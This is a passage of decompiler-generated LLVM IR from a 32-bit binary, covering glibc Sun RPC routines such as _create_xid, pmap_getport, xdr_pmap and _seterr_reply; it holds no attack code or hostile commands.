  %v0_8055bd9 = call i32 @__GI_xdr_replymsg()
  store i32 %v0_8055bd9, i32* %eax.global-to-local, align 4
  %v0_8055bde = load i32, i32* @esp, align 4
  %v1_8055be1 = icmp eq i32 %v0_8055bd9, 0
  %v0_8055c75 = load i32, i32* @esi, align 4
  %v1_8055c75 = add i32 %v0_8055c75, 44
  br i1 %v1_8055be1, label %dec_label_pc_8055c75, label %dec_label_pc_8055be9

dec_label_pc_8055be9:                             ; preds = %dec_label_pc_8055bc2
  store i32 %v1_8055c75, i32* %eax.global-to-local, align 4
  %v0_8055bec = load i32, i32* @ecx, align 4
  %v2_8055bec = add i32 %v0_8055bde, 12
  %v3_8055bec = inttoptr i32 %v2_8055bec to i32*
  store i32 %v0_8055bec, i32* %v3_8055bec, align 4
  %v0_8055bed = load i32, i32* @ecx, align 4
  %v2_8055bed = add i32 %v0_8055bde, 8
  %v3_8055bed = inttoptr i32 %v2_8055bed to i32*
  store i32 %v0_8055bed, i32* %v3_8055bed, align 4
  %v0_8055bee = load i32, i32* %eax.global-to-local, align 4
  %v2_8055bee = add i32 %v0_8055bde, 4
  %v3_8055bee = inttoptr i32 %v2_8055bee to i32*
  store i32 %v0_8055bee, i32* %v3_8055bee, align 4
  %v3_8055bef = inttoptr i32 %v0_8055bde to i32*
  store i32 %v2_8055bd0, i32* %v3_8055bef, align 4
  %v0_8055bf0 = call i32 @__GI__seterr_reply()
  store i32 %v0_8055bf0, i32* %eax.global-to-local, align 4
  %v0_8055bf5 = load i32, i32* @esp, align 4
  %v0_8055bf8 = load i32, i32* @esi, align 4
  %v1_8055bf8 = add i32 %v0_8055bf8, 44
  %v2_8055bf8 = inttoptr i32 %v1_8055bf8 to i32*
  %v3_8055bf8 = load i32, i32* %v2_8055bf8, align 4
  %v4_8055bf8 = icmp eq i32 %v3_8055bf8, 0
  %v1_8055bfc = icmp eq i1 %v4_8055bf8, false
  br i1 %v1_8055bfc, label %dec_label_pc_8055c4b, label %dec_label_pc_8055bfe

dec_label_pc_8055bfe:                             ; preds = %dec_label_pc_8055be9
  store i32 %tmp111, i32* %edx.global-to-local, align 4
  store i32 %v2_80558b5, i32* @ebx, align 4
  %v2_8055c07 = load i32, i32* %arg1, align 4
  store i32 %v2_8055c07, i32* %eax.global-to-local, align 4
  %v2_8055c09 = add i32 %v0_8055bf5, 12
  %v3_8055c09 = inttoptr i32 %v2_8055c09 to i32*
  store i32 %tmp111, i32* %v3_8055c09, align 4
  %v0_8055c0a = load i32, i32* %edx.global-to-local, align 4
  %v2_8055c0a = add i32 %v0_8055bf5, 8
  %v3_8055c0a = inttoptr i32 %v2_8055c0a to i32*
  store i32 %v0_8055c0a, i32* %v3_8055c0a, align 4
  %v1_8055c0b = add i32 %v2_8055c07, 32
  %v2_8055c0b = inttoptr i32 %v1_8055c0b to i32*
  %v3_8055c0b = load i32, i32* %v2_8055c0b, align 4
  store i32 %v3_8055c0b, i32* %edx.global-to-local, align 4
  %v2_8055c0e = add i32 %v0_8055bf5, 4
  %v3_8055c0e = inttoptr i32 %v2_8055c0e to i32*
  store i32 %v2_80558b5, i32* %v3_8055c0e, align 4
  %v3_8055c0f = inttoptr i32 %v0_8055bf5 to i32*
  store i32 %v2_8055c07, i32* %v3_8055c0f, align 4
  %v1_8055c10 = add i32 %v0_8055bf5, -4
  %v2_8055c10 = inttoptr i32 %v1_8055c10 to i32*
  store i32 134568979, i32* %v2_8055c10, align 4
  %v3_8055c10 = load i32, i32* %edx.global-to-local, align 4
  %v4_8055c10 = add i32 %v3_8055c10, 8
  %v5_8055c10 = inttoptr i32 %v4_8055c10 to i32*
  %v6_8055c10 = load i32, i32* %v5_8055c10, align 4
  call void @__pseudo_call(i32 %v6_8055c10)
  %v1_8055c16 = icmp eq i32 %v2_8055c07, 0
  %v1_8055c18 = icmp eq i1 %v1_8055c16, false
  br i1 %v1_8055c18, label %dec_label_pc_8055c28, label %dec_label_pc_8055c1a

dec_label_pc_8055c1a:                             ; preds = %dec_label_pc_8055bfe
  %v0_8055c1a = load i32, i32* @esi, align 4
  %v1_8055c1a = add i32 %v0_8055c1a, 44
  %v2_8055c1a = inttoptr i32 %v1_8055c1a to i32*
  store i32 7, i32* %v2_8055c1a, align 4
  %v0_8055c21 = load i32, i32* @esi, align 4
  %v1_8055c21 = add i32 %v0_8055c21, 48
  %v2_8055c21 = inttoptr i32 %v1_8055c21 to i32*
  store i32 6, i32* %v2_8055c21, align 4
  br label %dec_label_pc_8055c28

dec_label_pc_8055c28:                             ; preds = %dec_label_pc_8055bfe, %dec_label_pc_8055c1a
  %v4_8055c28 = icmp eq i32 %tmp, 0
  br i1 %v4_8055c28, label %dec_label_pc_8055c7c, label %dec_label_pc_8055c31

dec_label_pc_8055c31:                             ; preds = %dec_label_pc_8055c28
  store i32 %v1_80557d0, i32* %ecx.global-to-local, align 4
  %v1_8055c37 = inttoptr i32 %v1_80557d0 to i32*
  store i32 2, i32* %v1_8055c37, align 4
  %v1_8055c3d = load i32, i32* @esp, align 4
  %v2_8055c3d = add i32 %v1_8055c3d, -4
  %v3_8055c3d = inttoptr i32 %v2_8055c3d to i32*
  store i32 %v2_8055bd0, i32* %v3_8055c3d, align 4
  %v2_8055c3e = add i32 %v1_8055c3d, -8
  %v3_8055c3e = inttoptr i32 %v2_8055c3e to i32*
  store i32 %v2_8055bd0, i32* %v3_8055c3e, align 4
  %v2_8055c3f = add i32 %v1_8055c3d, -12
  %v3_8055c3f = inttoptr i32 %v2_8055c3f to i32*
  store i32 %v2_80558b5, i32* %v3_8055c3f, align 4
  %v0_8055c40 = load i32, i32* %ecx.global-to-local, align 4
  %v2_8055c40 = add i32 %v1_8055c3d, -16
  %v3_8055c40 = inttoptr i32 %v2_8055c40 to i32*
  store i32 %v0_8055c40, i32* %v3_8055c40, align 4
  %v0_8055c41 = load i32, i32* %stack_var_-20, align 4
  %v2_8055c41 = call i32 @xdr_opaque_auth(i32 %v0_8055c41, i32 %v0_8055735)
  store i32 %v2_8055c41, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8055c7c

dec_label_pc_8055c4b:                             ; preds = %dec_label_pc_8055be9
  %tmp133 = icmp slt i32 %stack_var_-9020.0, 1
  br i1 %tmp133, label %dec_label_pc_8055c7c, label %dec_label_pc_8055c54

dec_label_pc_8055c54:                             ; preds = %dec_label_pc_8055c4b
  store i32 %tmp111, i32* @ebx, align 4
  %v2_8055c5a = load i32, i32* %arg1, align 4
  store i32 %v2_8055c5a, i32* %eax.global-to-local, align 4
  %v1_8055c5c = add i32 %v2_8055c5a, 32
  %v2_8055c5c = inttoptr i32 %v1_8055c5c to i32*
  %v3_8055c5c = load i32, i32* %v2_8055c5c, align 4
  store i32 %v3_8055c5c, i32* %edx.global-to-local, align 4
  %v3_8055c5f = inttoptr i32 %v0_8055bf5 to i32*
  store i32 %v2_8055c5a, i32* %v3_8055c5f, align 4
  %v1_8055c60 = add i32 %v0_8055bf5, -4
  %v2_8055c60 = inttoptr i32 %v1_8055c60 to i32*
  store i32 134569059, i32* %v2_8055c60, align 4
  %v3_8055c60 = load i32, i32* %edx.global-to-local, align 4
  %v4_8055c60 = add i32 %v3_8055c60, 12
  %v5_8055c60 = inttoptr i32 %v4_8055c60 to i32*
  %v6_8055c60 = load i32, i32* %v5_8055c60, align 4
  call void @__pseudo_call(i32 %v6_8055c60)
  %v1_8055c66 = icmp eq i32 %v2_8055c5a, 0
  br i1 %v1_8055c66, label %dec_label_pc_8055c7c, label %dec_label_pc_8055c6a

dec_label_pc_8055c6a:                             ; preds = %dec_label_pc_8055c54
  %v0_8055c63 = load i32, i32* @esp, align 4
  %v1_8055c63 = add i32 %v0_8055c63, 16
  %v4_8055c6a = add i32 %stack_var_-9020.0, -1
  %v0_80557d0.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80557d0

dec_label_pc_8055c75:                             ; preds = %dec_label_pc_8055bc2
  %v2_8055c75 = inttoptr i32 %v1_8055c75 to i32*
  store i32 2, i32* %v2_8055c75, align 4
  br label %dec_label_pc_8055c7c

dec_label_pc_8055c7c:                             ; preds = %dec_label_pc_8055c54, %dec_label_pc_8055c4b, %dec_label_pc_8055c28, %dec_label_pc_8055c31, %dec_label_pc_8055c75
  %v0_8055c7c = load i32, i32* @esi, align 4
  %v1_8055c7c = add i32 %v0_8055c7c, 44
  %v2_8055c7c = inttoptr i32 %v1_8055c7c to i32*
  %v3_8055c7c = load i32, i32* %v2_8055c7c, align 4
  store i32 %v3_8055c7c, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8055c7f

dec_label_pc_8055c7f:                             ; preds = %dec_label_pc_8055b94, %dec_label_pc_8055a03, %dec_label_pc_8055773, %dec_label_pc_805584b, %dec_label_pc_8055c7c
  %v0_8055c86 = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_8055c86

; uselistorder directives
  uselistorder i32 %v2_8055c07, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8055bf5, { 5, 6, 0, 4, 1, 2, 3 }
  uselistorder i32 %v0_8055bde, { 3, 0, 1, 2 }
  uselistorder i32 %v1_8055b77, { 1, 2, 0 }
  uselistorder i32 %v1_8055b6e, { 1, 0 }
  uselistorder i32 %v6_8055b69, { 2, 4, 3, 5, 1, 0 }
  uselistorder i32 %v1_8055b50, { 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_8055b41, { 0, 2, 3, 1 }
  uselistorder i32 %v0_805578e, { 1, 2, 0 }
  uselistorder i32 %v1_8055b37, { 3, 2, 1, 0 }
  uselistorder i32 %v0_8055ac2, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v0_8055aaa, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v3_8055aa5, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v2_8055a4e, { 0, 3, 2, 1, 4 }
  uselistorder i32 %storemerge7.in.lcssa, { 1, 2, 0 }
  uselistorder i32 %v4_80559d1, { 1, 0 }
  uselistorder i32 %v4_80559c7, { 0, 2, 1 }
  uselistorder i32 %v1_805597e, { 2, 1, 0 }
  uselistorder i32 %v3_8055979, { 1, 2, 0 }
  uselistorder i32 %stack_var_-9016.3161, { 5, 6, 7, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_8055912, { 2, 3, 4, 5, 6, 1, 0 }
  uselistorder i32 %v0_80558fb, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v0_80558f6, { 1, 2, 0, 3 }
  uselistorder i32 %v1_80558e9, { 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-9028.2, { 2, 3, 5, 4, 1, 0 }
  uselistorder i32 %stack_var_-9008.2, { 5, 0, 1, 2, 3, 4 }
  uselistorder i32 %v1_80558bb, { 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-9028.1, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_8055875, { 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_805582f, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v2_805581e, { 3, 0, 1, 4, 2, 5 }
  uselistorder i32 %v0_8055814, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v1_80557d0, { 1, 0, 2, 4, 5, 6, 7, 8, 3, 9 }
  uselistorder i32 %stack_var_-9020.0, { 2, 0, 3, 1 }
  uselistorder i32 %stack_var_-9008.0, { 1, 0 }
  uselistorder i32 %stack_var_-9004.0, { 1, 0 }
  uselistorder i32 %stack_var_-9012.0, { 1, 0 }
  uselistorder i32 %stack_var_-9016.0, { 1, 0 }
  uselistorder i32 %v0_80557e3, { 1, 0 }
  uselistorder i32 %v2_8055bd0, { 2, 3, 4, 5, 6, 1, 0 }
  uselistorder i32 %v2_8055a6a, { 2, 3, 4, 5, 0, 1 }
  uselistorder i1 %v4_80557d9, { 1, 0 }
  uselistorder i32 %storemerge3, { 0, 4, 3, 2, 1 }
  uselistorder i32 %stack_var_-9000.0, { 1, 0, 2 }
  uselistorder i32 %v3_8055759, { 2, 1, 0 }
  uselistorder i32 %v2_8055751, { 1, 2, 0, 3 }
  uselistorder i32 %v0_8055735, { 1, 2, 0 }
  uselistorder i32 %v0_8055734, { 1, 0 }
  uselistorder i32 %v0_8055733, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 0, 2, 1 }
  uselistorder i16* %stack_var_-76, { 1, 0 }
  uselistorder i32* %stack_var_-20, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32 %tmp111, { 5, 0, 4, 3, 2, 1 }
  uselistorder i32* %eax.global-to-local, { 54, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 40, 16, 17, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 32, 31, 33, 34, 35, 36, 37, 38, 39, 41, 42, 43, 44, 45, 49, 50, 51, 52, 53, 55, 56, 57, 58, 59, 60, 61, 18, 46, 47, 48, 63, 62, 64, 65 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @__libc_recvfrom, { 1, 0 }
  uselistorder i32 92, { 2, 4, 0, 1, 3 }
  uselistorder i32 ()* @bcmp, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @__libc_recvmsg, { 1, 0 }
  uselistorder i32 8800, { 2, 0, 1 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @__libc_sendto, { 1, 0 }
  uselistorder i32 -28, { 2, 3, 4, 9, 0, 5, 1, 6, 7, 8 }
  uselistorder i32 -24, { 3, 4, 5, 0, 6, 7, 8, 1, 2 }
  uselistorder i64 1000, { 1, 0, 2 }
  uselistorder i32 1000, { 0, 1, 3, 2 }
  uselistorder i32 %arg6, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_8055c7f, { 4, 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_8055c7c, { 4, 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_8055c28, { 1, 0 }
  uselistorder label %dec_label_pc_8055b94, { 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_8055b8b, { 1, 0 }
  uselistorder label %dec_label_pc_8055b4d, { 9, 8, 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_8055b27, { 1, 0 }
  uselistorder label %dec_label_pc_80559c1, { 1, 0 }
  uselistorder label %dec_label_pc_8055958, { 1, 0 }
  uselistorder label %dec_label_pc_80558e9, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_80557a8, { 1, 0 }
}

define i32 @_create_xid() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v2_8055c96 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8055c96, i32* @ebx, align 4
  %v4_8055c9b = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-32, i32 134540701, i32 ptrtoint (i32* @global_var_80673a8.300 to i32))
  %v1_8055ca7 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_80673a8.300 to i32))
  %v0_8055caf = load i8, i8* @global_var_80673c0.301, align 64
  %v1_8055caf = icmp eq i8 %v0_8055caf, 0
  %v1_8055cb6 = icmp eq i1 %v1_8055caf, false
  br i1 %v1_8055cb6, label %dec_label_pc_8055ce5, label %dec_label_pc_8055cb8

dec_label_pc_8055cb8:                             ; preds = %entry
  %v0_8055cb8 = load i32, i32* @ecx, align 4
  %v2_8055cbc = ptrtoint i32* %stack_var_-16 to i32
  %v4_8055cc1 = call i32 @gettimeofday(i32 %v2_8055cbc, i32 0, i32 %v0_8055cb8, i32 %v0_8055cb8)
  %v4_8055cd1 = load i32, i32* %stack_var_-16, align 4
  %v5_8055cd1 = xor i32 %v4_8055cd1, %tmp
  %v2_8055cd6 = trunc i32 %v5_8055cd1 to i16
  %v3_8055cd6 = call i32 @__GI_srand48_r(i16 %v2_8055cd6, i32 ptrtoint (i32* @global_var_80673c4.302 to i32))
  store i8 1, i8* @global_var_80673c0.301, align 64
  br label %dec_label_pc_8055ce5

dec_label_pc_8055ce5:                             ; preds = %entry, %dec_label_pc_8055cb8
  %v2_8055ce5 = ptrtoint i32* %stack_var_-8 to i32
  %v0_8055ce9 = load i32, i32* @ecx, align 4
  %v4_8055cf1 = call i32 @lrand48_r(i32 ptrtoint (i32* @global_var_80673c4.302 to i32), i32 %v2_8055ce5, i32 %v0_8055ce9, i32 %v0_8055ce9)
  %v3_8055cfb = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-32, i32 1)
  %v3_8055d00 = load i32, i32* %stack_var_-8, align 4
  ret i32 %v3_8055d00

; uselistorder directives
  uselistorder i32 ptrtoint (i32* @global_var_80673c4.302 to i32), { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @gettimeofday, { 0, 2, 1 }
  uselistorder i8* @global_var_80673c0.301, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_80673a8.300 to i32), { 1, 0 }
  uselistorder label %dec_label_pc_8055ce5, { 1, 0 }
}

define i32 @pmap_getport(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-14 = alloca i16, align 2
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_8055d0c = load i32, i32* @edi, align 4
  %v0_8055d0e = load i32, i32* @ebx, align 4
  store i32 %v0_8055d0e, i32* %stack_var_-12, align 4
  store i32 %arg1, i32* @edi, align 4
  store i16 0, i16* %stack_var_-14, align 2
  store i32 -1, i32* %stack_var_-20, align 4
  %v1_8055d25 = add i32 %arg1, 2
  %v2_8055d25 = inttoptr i32 %v1_8055d25 to i16*
  store i16 28416, i16* %v2_8055d25, align 2
  %v2_8055d35 = ptrtoint i32* %stack_var_-20 to i32
  %v0_8055d4d = load i32, i32* @edi, align 4
  %v9_8055d4e = call i32 @__GI_clntudp_bufcreate(i32 %v0_8055d4d, i32 100000, i32 2, i32 5, i32* null, i32 %v2_8055d35, i32 400, i32 400)
  store i32 %v9_8055d4e, i32* @ebx, align 4
  %v1_8055d58 = icmp eq i32 %v9_8055d4e, 0
  br i1 %v1_8055d58, label %dec_label_pc_8055de9, label %dec_label_pc_8055ddc

dec_label_pc_8055ddc:                             ; preds = %entry
  %v0_8055d60 = call i32 @__GI___rpc_thread_createerr()
  store i32 %v0_8055d60, i32* %esi.global-to-local, align 4
  %v0_8055d8f = load i32, i32* @ebx, align 4
  %v1_8055d8f = add i32 %v0_8055d8f, 4
  %v2_8055d8f = inttoptr i32 %v1_8055d8f to i32*
  %v3_8055d8f = load i32, i32* %v2_8055d8f, align 4
  store i32 %v3_8055d8f, i32* @ecx, align 4
  %v5_8055dad = inttoptr i32 %v3_8055d8f to i32*
  %v6_8055dad = load i32, i32* %v5_8055dad, align 4
  call void @__pseudo_call(i32 %v6_8055dad)
  %v0_8055db6 = load i32, i32* %esi.global-to-local, align 4
  %v1_8055db6 = inttoptr i32 %v0_8055db6 to i32*
  store i32 14, i32* %v1_8055db6, align 4
  %v0_8055dc1 = load i32, i32* @ebx, align 4
  %v1_8055dc1 = add i32 %v0_8055dc1, 4
  %v2_8055dc1 = inttoptr i32 %v1_8055dc1 to i32*
  %v3_8055dc1 = load i32, i32* %v2_8055dc1, align 4
  %v5_8055dc6 = add i32 %v3_8055dc1, 8
  %v6_8055dc6 = inttoptr i32 %v5_8055dc6 to i32*
  %v7_8055dc6 = load i32, i32* %v6_8055dc6, align 4
  call void @__pseudo_call(i32 %v7_8055dc6)
  %v0_8055ddf = load i32, i32* @ebx, align 4
  %v1_8055ddf = add i32 %v0_8055ddf, 4
  %v2_8055ddf = inttoptr i32 %v1_8055ddf to i32*
  %v3_8055ddf = load i32, i32* %v2_8055ddf, align 4
  %v5_8055de3 = add i32 %v3_8055ddf, 16
  %v6_8055de3 = inttoptr i32 %v5_8055de3 to i32*
  %v7_8055de3 = load i32, i32* %v6_8055de3, align 4
  call void @__pseudo_call(i32 %v7_8055de3)
  br label %dec_label_pc_8055de9

dec_label_pc_8055de9:                             ; preds = %entry, %dec_label_pc_8055ddc
  %v0_8055de9 = load i32, i32* @edi, align 4
  %v1_8055de9 = add i32 %v0_8055de9, 2
  %v2_8055de9 = inttoptr i32 %v1_8055de9 to i16*
  store i16 0, i16* %v2_8055de9, align 2
  %v3_8055def = load i16, i16* %stack_var_-14, align 2
  %v4_8055def = sext i16 %v3_8055def to i32
  %v2_8055df7 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8055df7, i32* @ebx, align 4
  store i32 %v0_8055d0c, i32* @edi, align 4
  ret i32 %v4_8055def

; uselistorder directives
  uselistorder i32 %v9_8055d4e, { 1, 0 }
  uselistorder i32* %stack_var_-20, { 1, 0 }
  uselistorder i16* %stack_var_-14, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8055de9, { 1, 0 }
}

define i32 @__GI_xdr_pmap(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %v0_8055dfc = load i32, i32* @esi, align 4
  store i32 %arg1, i32* %esi.global-to-local, align 4
  %v2_8055e0b = inttoptr i32 %arg1 to i32*
  %v3_8055e0b = call i32 @xdr_u_long(i32* %v2_8055e0b, i32 %arg2)
  %v1_8055e13 = icmp eq i32 %v3_8055e0b, 0
  br i1 %v1_8055e13, label %dec_label_pc_8055e50, label %dec_label_pc_8055e17

dec_label_pc_8055e17:                             ; preds = %entry
  %v0_8055e19 = load i32, i32* @ebx, align 4
  %v1_8055e19 = add i32 %v0_8055e19, 4
  store i32 %v1_8055e19, i32* @eax, align 4
  %v0_8055e1d = load i32, i32* %esi.global-to-local, align 4
  %v2_8055e1e = inttoptr i32 %v0_8055e1d to i32*
  %v3_8055e1e = call i32 @xdr_u_long(i32* %v2_8055e1e, i32 %v1_8055e19)
  %v1_8055e26 = icmp eq i32 %v3_8055e1e, 0
  br i1 %v1_8055e26, label %dec_label_pc_8055e50, label %dec_label_pc_8055e2a

dec_label_pc_8055e2a:                             ; preds = %dec_label_pc_8055e17
  %v0_8055e2c = load i32, i32* @ebx, align 4
  %v1_8055e2c = add i32 %v0_8055e2c, 8
  store i32 %v1_8055e2c, i32* @eax, align 4
  %v0_8055e30 = load i32, i32* %esi.global-to-local, align 4
  %v2_8055e31 = inttoptr i32 %v0_8055e30 to i32*
  %v3_8055e31 = call i32 @xdr_u_long(i32* %v2_8055e31, i32 %v1_8055e2c)
  %v1_8055e39 = icmp eq i32 %v3_8055e31, 0
  br i1 %v1_8055e39, label %dec_label_pc_8055e50, label %dec_label_pc_8055e3d

dec_label_pc_8055e3d:                             ; preds = %dec_label_pc_8055e2a
  %v0_8055e3d = load i32, i32* @ebx, align 4
  %v1_8055e3d = add i32 %v0_8055e3d, 12
  store i32 %v1_8055e3d, i32* @eax, align 4
  %v0_8055e40 = load i32, i32* %esi.global-to-local, align 4
  store i32 %v0_8055dfc, i32* %esi.global-to-local, align 4
  %v2_8055e4b = inttoptr i32 %v0_8055e40 to i32*
  %v3_8055e4b = call i32 @xdr_u_long(i32* %v2_8055e4b, i32 %v1_8055e3d)
  br label %dec_label_pc_8055e50

dec_label_pc_8055e50:                             ; preds = %dec_label_pc_8055e2a, %dec_label_pc_8055e17, %entry, %dec_label_pc_8055e3d
  store i32 %v0_8055dfc, i32* %esi.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_8055dfc, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8055e50, { 3, 0, 1, 2 }
}

define i32 @__GI__seterr_reply() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp2, i32* %ecx.global-to-local, align 4
  store i32 %tmp, i32* %edx.global-to-local, align 4
  %v1_8055e60 = add i32 %tmp2, 8
  %v2_8055e60 = inttoptr i32 %v1_8055e60 to i32*
  %v3_8055e60 = load i32, i32* %v2_8055e60, align 4
  store i32 %v3_8055e60, i32* %eax.global-to-local, align 4
  %v1_8055e63 = icmp eq i32 %v3_8055e60, 0
  br i1 %v1_8055e63, label %dec_label_pc_8055e70, label %dec_label_pc_8055e67

dec_label_pc_8055e67:                             ; preds = %entry
  %v1_8055e67 = add i32 %v3_8055e60, -1
  %v8_8055e67 = icmp eq i32 %v1_8055e67, 0
  store i32 %v1_8055e67, i32* %eax.global-to-local, align 4
  %v1_8055e68 = icmp eq i1 %v8_8055e67, false
  br i1 %v1_8055e68, label %dec_label_pc_8055ef8, label %dec_label_pc_8055ec9

dec_label_pc_8055e70:                             ; preds = %entry
  %v1_8055e70 = add i32 %tmp2, 24
  %v2_8055e70 = inttoptr i32 %v1_8055e70 to i32*
  %v3_8055e70 = load i32, i32* %v2_8055e70, align 4
  store i32 %v3_8055e70, i32* %eax.global-to-local, align 4
  %v1_8055e73 = icmp eq i32 %v3_8055e70, 0
  %v1_8055e75 = icmp eq i1 %v1_8055e73, false
  br i1 %v1_8055e75, label %dec_label_pc_8055e7e, label %dec_label_pc_8055e77

dec_label_pc_8055e77:                             ; preds = %dec_label_pc_8055e70
  %v1_8055e77 = inttoptr i32 %tmp to i32*
  store i32 0, i32* %v1_8055e77, align 4
  %v0_8055e7d = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_8055e7d

dec_label_pc_8055e7e:                             ; preds = %dec_label_pc_8055e70
  switch i32 %tmp2, label %dec_label_pc_8055eba [
    i32 0, label %dec_label_pc_8055eb2
    i32 1, label %dec_label_pc_8055e8a
    i32 2, label %dec_label_pc_8055e92
    i32 3, label %dec_label_pc_8055e9a
    i32 4, label %dec_label_pc_8055ea2
    i32 5, label %dec_label_pc_8055eaa
  ]

dec_label_pc_8055e8a:                             ; preds = %dec_label_pc_8055e7e
  %v1_8055e8a = inttoptr i32 %tmp to i32*
  store i32 8, i32* %v1_8055e8a, align 4
  br label %dec_label_pc_8055f04

dec_label_pc_8055e92:                             ; preds = %dec_label_pc_8055e7e
  %v1_8055e92 = inttoptr i32 %tmp to i32*
  store i32 9, i32* %v1_8055e92, align 4
  br label %dec_label_pc_8055f04

dec_label_pc_8055e9a:                             ; preds = %dec_label_pc_8055e7e
  %v1_8055e9a = inttoptr i32 %tmp to i32*
  store i32 10, i32* %v1_8055e9a, align 4
  br label %dec_label_pc_8055f04

dec_label_pc_8055ea2:                             ; preds = %dec_label_pc_8055e7e
  %v1_8055ea2 = inttoptr i32 %tmp to i32*
  store i32 11, i32* %v1_8055ea2, align 4
  br label %dec_label_pc_8055f04

dec_label_pc_8055eaa:                             ; preds = %dec_label_pc_8055e7e
  %v1_8055eaa = inttoptr i32 %tmp to i32*
  store i32 12, i32* %v1_8055eaa, align 4
  br label %dec_label_pc_8055f04

dec_label_pc_8055eb2:                             ; preds = %dec_label_pc_8055e7e
  %v1_8055eb2 = inttoptr i32 %tmp to i32*
  store i32 0, i32* %v1_8055eb2, align 4
  br label %dec_label_pc_8055f04

dec_label_pc_8055eba:                             ; preds = %dec_label_pc_8055e7e
  %v1_8055eba = inttoptr i32 %tmp to i32*
  store i32 16, i32* %v1_8055eba, align 4
  %v0_8055ec0 = load i32, i32* %edx.global-to-local, align 4
  %v1_8055ec0 = add i32 %v0_8055ec0, 4
  %v2_8055ec0 = inttoptr i32 %v1_8055ec0 to i32*
  store i32 0, i32* %v2_8055ec0, align 4
  br label %dec_label_pc_8055ef3

dec_label_pc_8055ec9:                             ; preds = %dec_label_pc_8055e67
  %v1_8055ec9 = add i32 %tmp2, 12
  %v2_8055ec9 = inttoptr i32 %v1_8055ec9 to i32*
  %v3_8055ec9 = load i32, i32* %v2_8055ec9, align 4
  store i32 %v3_8055ec9, i32* %eax.global-to-local, align 4
  %v9_8055ecc = icmp eq i32 %v3_8055ec9, 1
  br i1 %v9_8055ecc, label %dec_label_pc_8055ede, label %dec_label_pc_8055ed1

dec_label_pc_8055ed1:                             ; preds = %dec_label_pc_8055ec9
  %v9_8055ed1 = icmp eq i32 %v3_8055ec9, 6
  %v1_8055ed4 = icmp eq i1 %v9_8055ed1, false
  %v1_8055ee6 = inttoptr i32 %tmp to i32*
  br i1 %v1_8055ed4, label %dec_label_pc_8055ee6, label %dec_label_pc_8055ed6

dec_label_pc_8055ed6:                             ; preds = %dec_label_pc_8055ed1
  store i32 6, i32* %v1_8055ee6, align 4
  br label %dec_label_pc_8055f04

dec_label_pc_8055ede:                             ; preds = %dec_label_pc_8055ec9
  %v1_8055ede = inttoptr i32 %tmp to i32*
  store i32 7, i32* %v1_8055ede, align 4
  br label %dec_label_pc_8055f04

dec_label_pc_8055ee6:                             ; preds = %dec_label_pc_8055ed1
  store i32 16, i32* %v1_8055ee6, align 4
  %v0_8055eec = load i32, i32* %edx.global-to-local, align 4
  %v1_8055eec = add i32 %v0_8055eec, 4
  %v2_8055eec = inttoptr i32 %v1_8055eec to i32*
  store i32 1, i32* %v2_8055eec, align 4
  br label %dec_label_pc_8055ef3

dec_label_pc_8055ef3:                             ; preds = %dec_label_pc_8055eba, %dec_label_pc_8055ee6
  %v0_8055ef3 = load i32, i32* %eax.global-to-local, align 4
  %v1_8055ef3 = load i32, i32* %edx.global-to-local, align 4
  %v2_8055ef3 = add i32 %v1_8055ef3, 8
  %v3_8055ef3 = inttoptr i32 %v2_8055ef3 to i32*
